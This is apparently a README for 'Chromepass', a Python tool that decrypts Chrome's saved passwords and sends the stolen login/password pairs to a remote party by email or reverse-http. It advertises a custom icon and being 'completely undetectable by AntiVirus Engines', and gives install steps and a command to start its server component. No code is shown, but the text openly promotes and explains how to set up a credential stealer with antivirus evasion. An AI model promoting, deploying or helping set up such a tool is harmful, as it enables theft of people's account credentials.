# Chromepass - Hacking Chrome Saved Passwords


About The project

Decrypt Chrome saved paswords
Send a file with the login/password combinations remotely (email or reverse-http)
Custom icon
Completely undetectable by AntiVirus Engines

Getting started

Dependencies and Requirements

This is a very simple application, which uses only:

Python - Only tested on 3.7.4 but should work in 3.6+

Installation

Chromepass requires Python 3.6+ to run.

Install the dependencies:

> cd chromepass
> pip install -r requirements.txt

If any errors occur make sure you're running on the proper environment (if applcable) and that you have python 3.6+ (preferably 3.7.4). If the errors persist, try:

> python -m pip install --upgrade pip
> python -m pip install -r requirements.txt

Usage

Chromepass is very straightforward. Start by running:

> python create_server.py
